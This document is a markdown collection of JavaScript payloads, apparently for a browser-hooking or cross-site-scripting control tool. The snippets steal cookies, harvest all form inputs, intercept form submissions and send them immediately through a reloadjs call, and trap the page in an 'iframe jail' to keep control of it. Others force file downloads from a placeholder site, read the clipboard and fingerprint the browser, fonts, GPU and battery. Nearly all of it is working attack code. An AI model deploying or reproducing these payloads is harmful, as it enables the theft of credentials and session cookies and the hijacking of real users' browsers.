# Default
#### Grab cookies
```javascript
data=document.cookie;
```
#### Get location url
```javascript
data = document.location.href;
```
#### Get os and cpu info
```javascript
data = navigator.platform;
```
#### Vibrate for one second
###### Only for mobile devices
```javascript
navigator.vibrate(1000); data=0;
```
#### Get misc info (better for mobile)
```javascript
data="vendor: "+navigator.vendorSub+","+navigator.vendor+";Product: "+navigator.productSub+";Core: "+navigator.hardwareConcurrency+";maxTouchPoints: "+navigator.maxTouchPoints;
```
#### Send popup message
```javascript
alert('text'); data=0;
```
#### Grab all inputs from all forms:
```javascript
var kvpairs = [];
var iframe = document.getElementById("ifrm");
if (iframe != null)
    var doc = iframe.contentDocument;
else
    var doc = document;
var forms = doc.getElementsByTagName("form");
for (var j = 0;j < forms.length;j++) {
    var form = forms[j];
    for ( var i = 0; i < form.elements.length; i++ ) {
       var e = form.elements[i];
       kvpairs.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value));
    }
}
data = kvpairs.join("&");
```

#### Get information about plugins
```javascript
data = JSON.stringify(navigator.plugins);
```

#### Get browser information
```javascript
data = navigator.appName+" "+navigator.appCodeName+" "+navigator.appVersion;
```
#### Enumerate navigator properties
```javascript
data="";for (var p in navigator) data+=p.toString()+";";
```
#### Get screen information
```javascript
data="width: "+screen.width+",height: "+screen.height+",colorDepth: "+screen.colorDepth+",pixelDepth: "+screen.pixelDepth;
```
#### Get battery information
```javascript
var Battery=function(){function s(e){n=e,i(n)}function o(t){for(var n in e.split(" "))t.addEventListener(n,s)}var e="chargingchange chargingtimechange dischargingtimechange levelchange",t=navigator.battery||navigator.mozBattery||navigator.getBattery,n=null,r=function(){},i=function(){};return self.getStatus=function(e){n==="not supported"?e(null,n):n?e(n):r=e},self.onUpdate=function(e){i=e},t instanceof Function?t.call(navigator).then(function(e){n=e,r(n),o(n)},function(){n="not supported"}):t?(n=t,o(t)):n="not supported",self}(Battery||{});
Battery.getStatus(function(status, error) {
  if(error) {
    console.error('Battery status is not supported');
    return;
  }
  data='Level: ' + Math.floor(status.level * 100) + '%;Charging: ' + status.charging+';Time until charged: ' + status.chargingTime+';Battery time left: ' + status.dischargingTime;
});
```
#### Delete client registration
```javascript
eraseCookie('_uidk'); localStorage.clear(); data=0;
```
#### Iframe jail
```javascript
document.body.innerHTML = "<div style='padding:0;margin:0;border:none;width:100%;height:100%;position:absolute;left:0;top:0;overflow:hidden;'><iframe id='ifrm' onload='window.history.replaceState(null, null, this.contentWindow.location.href);' style='padding:0;margin:0;border:none;width:100%;height:100%;left:0;top:0;' src='"+document.location.href+"'></iframe></div>"; data='captured';
```
#### Force (every kind of) file to be downloaded (html5)
```javascript
var fdwnl = document.createElement("a"); fdwnl.href='http://yoursite.com/yourfile.html'; fdwnl.id='fdwnl'; var dwn=document.createAttribute('download');fdwnl.setAttributeNode(dwn); fdwnl.click();
```
#### Force an update of the client information retrieved server side
```javascript
eraseCookie('_uidku');data=0;
```
#### Intercept forms submit
```javascript
var iframe = document.getElementById("ifrm");
if (iframe != null)
    var doc = iframe.contentDocument;
else
    var doc = document;
var forms = doc.getElementsByTagName("form");
for (var j = 0;j < forms.length;j++) {
    var form = forms[j];
    form.onsubmit = function(){ inthandler(this); }
}
function inthandler(form) {
    var kvpairs = [];
    data = "form submitted! id="+form.id+"&name="+form.name+"&method="+form.method+"&action="+form.action+"&";
    for ( var i = 0; i < form.elements.length; i++ ) {
       var e = form.elements[i];
       kvpairs.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value));
    }
    data = kvpairs.join("&");
    /* Force to send data instantly */
    reloadjs(uid,data);
}
```
# Extra
#### Detect installed font (and the os)
```javascript
var Detector = function() {
		// a font will be compared against all the three default fonts.
		// and if it doesn't match all 3 then that font is not available.
		var baseFonts = ['monospace', 'sans-serif', 'serif'];

		//we use m or w because these two characters take up the maximum width.
		// And we use a LLi so that the same matching fonts can get separated
		var testString = "mmmmmmmmmmlli";

		//we test using 72px font size, we may use any size. I guess larger the better.
		var testSize = '72px';

		var h = document.getElementsByTagName("body")[0];
		// create a SPAN in the document to get the width of the text we use to test
		var s = document.createElement("span");
		s.style.fontSize = testSize;
		s.innerHTML = testString;
		var defaultWidth = {};
		var defaultHeight = {};

		for (var index in baseFonts) {
		    //get the default width for the three base fonts
		    s.style.fontFamily = baseFonts[index];
		    h.appendChild(s);
		    defaultWidth[baseFonts[index]] = s.offsetWidth; //width for the default font
		    defaultHeight[baseFonts[index]] = s.offsetHeight; //height for the defualt font
		    h.removeChild(s);
		}

		function detect(font) {
		    var detected = false;
		    for (var index in baseFonts) {
		        s.style.fontFamily = font + ',' + baseFonts[index]; // name of the font along with the base font for fallback.
		        h.appendChild(s);
		        var matched = (s.offsetWidth != defaultWidth[baseFonts[index]] || s.offsetHeight != defaultHeight[baseFonts[index]]);
		        h.removeChild(s);
		        detected = detected || matched;
		    }
		    return detected;
		}
		this.detect = detect;
	}
var fonts = [];
var d = new Detector();
/* Windows fonts */
fonts.push("Georgia"); fonts.push("Times New Roman"); fonts.push("Tahoma"); fonts.push("Verdana");
/* MAC fonts */
fonts.push("Apple Chancery"); fonts.push("Apple Symbols"); fonts.push("Apple Braille");
/* Linux fonts */
fonts.push("Helvetica"); fonts.push("Utopia"); fonts.push("FreeMono"); fonts.push("FreeSerif");
data="";
for (i = 0; i < fonts.length; i++) {
    if(d.detect(fonts[i])) data += fonts[i]+";";
}
```
#### Get memory information
###### Supported only by some old browser
```javascript
data = "totalJSHeapSize="+console.memory.totalJSHeapSize+";jsHeapSizeLimit="+console.memory.jsHeapSizeLimit+";usedJSHeapSize="+console.memory.usedJSHeapSize;
```
#### Get GPU information
##### Supported only by some (probably old) browser
```javascript
var canvas = document.createElement("canvas");
gl = canvas.getContext("experimental-webgl");
data = "GPU: "+gl.getParameter(gl.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)+" "+gl.getParameter(gl.getExtension("WEBGL_debug_renderer_info").UNMASKED_VENDOR_WEBGL);
```
#### Get text in the clipboard
###### Only for IE, ask for permission
```javascript
data=window.clipboardData.getData('Text');
```

